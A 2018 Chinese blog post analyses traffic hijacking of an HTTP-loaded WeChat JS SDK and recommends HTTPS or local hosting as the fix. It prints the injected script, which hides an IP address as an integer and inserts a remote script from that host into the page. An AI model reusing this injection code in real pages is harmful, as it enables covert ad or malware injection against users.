---
Title: 记一次流量劫持
Tags: 编码
PublishDate: 2018/9/17 15:15
---

又是填队友坑，拿到代码本地启动后发现神奇的一幕，页面被劫持插入了广告，弹出几秒钟后消失。

![jc0](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8cuxcsj30bf037dgb.jpg)

让我来看看这是咋回事，因为某个微信 sdk 使用了 http，该 JS 脚本的响应结果被篡改替换了。

![jc2](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8i86ugj30kq01dwei.jpg)

![jc3](http://wx4.sinaimg.cn/large/007113CZgy1fvcl8ncohpj31370ia0va.jpg)

**http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 该请求因为使用了 http 给了流量劫持可乘之机，未能返回正确的脚本内容，而是返回了一个被精心构造的恶意脚本。

简单分析下这个恶意脚本做了啥，我们 http 请求 **http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 的响应结果被劫持替换成了下面的脚本，这个脚本又再次构造请求带上标识符去拿到真实的内容，同时将自己的恶意脚本注入到页面上。


```javascript
!function(e, t, n, o, r, i, a, c) {
    // 这里有意思了，之后后会发现变量 c 的结果是一个 IP 地址
    // "124.232.160.178"
    // 这个 IP 地址加上拼凑的字符串变成了 http://124.232.160.178/v1/a/?u=0 
    // 通过 insertBefore 注入了恶意脚本
    c = function(e, t, n) {
        for (t = e % 256,
        n = 3; 0 < n; n--)
            t = (e = Math.floor(e / 256)) % 256 + "." + t;
        return t
    }(2095620274),
    (a = function(e) {
        r = t.createElement(n),
        i = t.getElementsByTagName(n)[0],
        r.src = "//" + e,
        i.parentNode.insertBefore(r, i)
    }
    // 这儿有点意思，似乎是为了避免重复劫持，
    // 通过时间戳和标识符再次请求我们需要的脚本，
    // 这次返回的是真实未被篡改的脚本内容
    )(o + (0 < o.indexOf("?") ? "&" : "?") + "_t" + (new Date).getTime() + "=0i"),
    // 注入恶意脚本 http://124.232.160.178/v1/a/?u=0 
    a(c + "/v1/a/?u=0")
}(window, document, "script", "res.wx.qq.com/open/js/jweixin-1.2.0.js");
```

所以解决问题的办法就是把页面上的 http 替换成 https 或是把资源放到本地存储。

顺手查一下这个 IP 地址的信息发现了一些有意思的事情，这回是哪个临时工背锅呢？

![jc4](http://wx1.sinaimg.cn/large/007113CZgy1fvcl8rf54hj30fu057glv.jpg)

![jcyys](http://wx1.sinaimg.cn/mw690/007113CZgy1fvcl8y06f5j30kf0l7417.jpg)

**流量劫持与防治**

从输入 url 到显示网页所经历的几个过程应该都清楚

1. 首先通过递归轮询 DNS 解析域名获得主机 IP 地址
2. 访问主机 IP 获取资源

因为 Web 是建立在 HTTP 协议上的，这个协议既不能维持状态，又是明文传输，中间链路上任何设备都可以篡改其内容，谁要是想搞点小心思简直轻而易举。流量劫持本身就可以发生在第一步，即解析获得 IP 地址这个过程，有以下可能的劫持方式：

* 如果我们的 DNS 受到污染返回了伪造的主机 IP 那就 GG 了，而解析 DNS 会先尝试本地解析，比如前端经常会修改的 hosts 文件，这个文件是可以被恶意软件篡改的。

* 如果本地解析没有命中，那么浏览器本身也会尝试在自己的缓存中查找，如果找不到就会去域名服务器查询，公共的域名服务器也就是我们在网上邻居里配的哪个，通常默认由 ISP 服务商提供，如果 ISP 提供的域名服务器找不到才会去顶级域名服务器发起查询，再往上就是根域名服务器。那么问题来了，如果 ISP 提供的域名查询服务器作恶或是被黑客控制咋办，那影响就大了，因此只能自己配置权威可信的第三方域名解析服务器，比如`8.8.8.8` 或者 `阿里公共 DNS`等。
* 访问主机获取资源时，如果 TCP 链路中某个设备抢先服务器一步发送了伪造的响应包，那么正常的响应包就会被忽略，这样我们的请求就被劫持了，收到了被篡改伪造的内容，它可以随意插入广告和木马或是钓鱼，而且这种劫持要深入到网络层去抓包才能定位。

从根本上解决劫持的策略就是启用 https，或许我们也可以通过监控页面的资源加载，然后上报比对关键信息来获知页面在用户侧是否遭到了篡改，但这个成本就更大了。